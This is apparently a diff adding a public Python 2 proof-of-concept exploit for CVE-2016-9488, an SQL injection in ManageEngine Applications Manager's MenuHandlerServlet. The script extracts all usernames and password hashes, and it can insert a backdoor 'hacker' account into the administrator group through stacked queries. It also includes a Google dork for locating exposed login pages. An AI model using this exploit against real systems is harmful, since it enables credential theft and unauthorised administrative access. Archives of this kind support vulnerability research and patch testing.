@@ -1,0 +1,95 @@
+# Exploit Title: ManageEngine Applications Manager 13 - 'MenuHandlerServlet' SQL Injection
+# Google Dork: intitle:"Applications Manager Login Screen"
+# Date: 2020-07-23
+# Exploit Author: aldorm
+# Vendor Homepage: https://www.manageengine.com/
+# Software Link:
+# Version: 12 and 13 before Build 13200
+# Tested on: Windows
+# CVE : 2016-9488
+
+#!/usr/bin/env python2
+
+# App:          ManageEngine Applications Manager
+# Versions:     12 and 13 before build 13200
+# CVE:          CVE-2016-9488
+# Vuln Type:    SQL Injection
+# CVSSv3:       9.8
+# 
+# PoC Autor:    aldorm
+# Release date: 23-07-2020
+
+# ./poc_CVE-2016-9488.py 192.168.123.113 8443 --create-user-hacker
+# [*] Extracting all users:
+# 	 admin:21232f297a57a5a743894a0e4a801fc3
+# 	 reportadmin:21232f297a57a5a743894a0e4a801fc3
+# 	 systemadmin_enterprise:21232f297a57a5a743894a0e4a801fc3
+# [*] Creating new user: 
+# 	User: hacker 
+#	Password: admin
+# [*] Verifing created user...
+# Success.
+
+
+import sys 
+import requests
+import urllib3
+import json
+
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+target = 'localhost'
+
+def get_userpassword():
+    sqli = ' UNION ALL SELECT userid,CONCAT(username,$$:$$,password),NULL FROM am_userpasswordtable--'
+    r= requests.get('https://%s:%s/servlet/MenuHandlerServlet' % (target,port ), params= 'action=verticalmenulist&config_id=0 %s' % sqli, verify=False);
+    j = json.loads(r.text)
+    return j
+
+def create_user():
+    sqli = '; INSERT INTO am_userpasswordtable VALUES (123123123, $$hacker$$,$$21232f297a57a5a743894a0e4a801fc3$$,NULL,NULL,$$21232f297a57a5a743894a0e4a801fc3$$,1);  -- '
+    r= requests.get('https://%s:%s/servlet/MenuHandlerServlet' % (target,port ), params= 'action=verticalmenulist&config_id=0 %s' % sqli, verify=False);
+
+    sqli = ';INSERT INTO amdb.public.am_usergrouptable VALUES ($$hacker$$,$$USERS$$);  -- '
+    r= requests.get('https://%s:%s/servlet/MenuHandlerServlet' % (target,port ), params= 'action=verticalmenulist&config_id=0 %s' % sqli, verify=False);
+
+    sqli = ';INSERT INTO amdb.public.am_usergrouptable VALUES ($$hacker$$,$$ADMIN$$);  -- '
+    r= requests.get('https://%s:%s/servlet/MenuHandlerServlet' % (target,port ), params= 'action=verticalmenulist&config_id=0 %s' % sqli, verify=False);
+
+    return 
+
+
+def main ():
+    if not len(sys.argv) > 2:
+        print "Usage %s <target> <port> [--create-user-hacker]" % sys.argv[0]
+        print "e.g. %s manageengine 8443 " % sys.argv[0]
+        sys.exit(1)
+
+    global target
+    global port
+    target=sys.argv[1]
+    port=sys.argv[2]
+
+    print "[*] Extracting all users:"
+    j = get_userpassword()
+    for user in j["0"]:
+        print "\t %s" % user[1]
+    
+
+    if len(sys.argv) == 4 and sys.argv[3] == '--create-user-hacker':
+        print "[*] Creating new user: \n\tUser: hacker \n\tPassword: admin"    
+        create_user()
+        print "[*] Verifing created user..."
+
+        j = get_userpassword()
+        for user in j["0"]:
+            if user[1] == "hacker:21232f297a57a5a743894a0e4a801fc3":
+                print "Success."
+                return
+        print "User not created."
+
+
+
+if __name__ == '__main__':
+    main()
